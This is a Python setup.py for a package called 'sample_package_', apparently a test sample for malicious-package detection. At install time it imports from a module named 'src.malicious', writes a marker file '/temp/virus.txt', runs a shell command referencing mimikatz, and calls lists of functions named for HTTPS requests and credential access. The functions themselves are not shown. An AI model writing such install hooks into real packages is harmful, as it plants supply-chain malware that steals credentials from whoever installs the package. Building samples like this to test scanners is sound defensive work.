import sys
import os
from datetime import datetime
from pathlib import Path
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(SCRIPT_DIR)

from setuptools import setup, find_packages
from src.malicious import *

setup(name="sample_package_",
      packages=find_packages(),)

Path("/temp").mkdir(parents=True, exist_ok=True)
with open("/temp/virus.txt", "w", encoding="utf-8") as buffer:
    buffer.write(f"I was here at {datetime.now()} ;>")
    os.system("echo ' -c \"!mimikatz\'")

[f("setup.py", True) for f in https_functions + access_credentials_functions]